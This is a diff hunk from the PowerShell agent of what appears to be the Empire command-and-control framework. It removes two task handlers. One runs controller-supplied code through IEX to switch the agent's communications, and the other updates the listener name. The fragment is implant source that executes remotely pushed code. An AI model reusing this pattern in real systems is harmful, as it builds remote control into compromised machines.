@@ -1152,28 +1152,6 @@ function Invoke-Empire {
                 $script:tasks[$ResultID]['status'] = 'running'
             }
 
-            elseif($type -eq 220) {
-                #Dynamically update agent comms
-                try {
-                    IEX $data
-
-                    Encode-Packet -type $type -data "[+] Switched the current listener to: $CurrentListenerName" -ResultID $ResultID;
-                    $script:tasks[$ResultID]['status'] = 'completed'
-                }
-                catch {
-                    Encode-Packet -type 0 -data ("[!] Unable to update agent comm methods: $_") -ResultID $ResultID;
-                    $script:tasks[$ResultID]['status'] = 'error'
-                }
-            }
-
-            elseif($type -eq 221) {
-                # Update the listener name variable
-                $script:CurrentListenerName = $data;
-
-                Encode-Packet -type $type -data "[+] Updated the CurrentListenerName to: $CurrentListenerName" -ResultID $ResultID;
-                $script:tasks[$ResultID]['status'] = 'completed'
-            }
-
             else{
                 Encode-Packet -type 0 -data "[!] invalid type: $type" -ResultID $ResultID;
                 $script:tasks[$ResultID]['status'] = 'error'
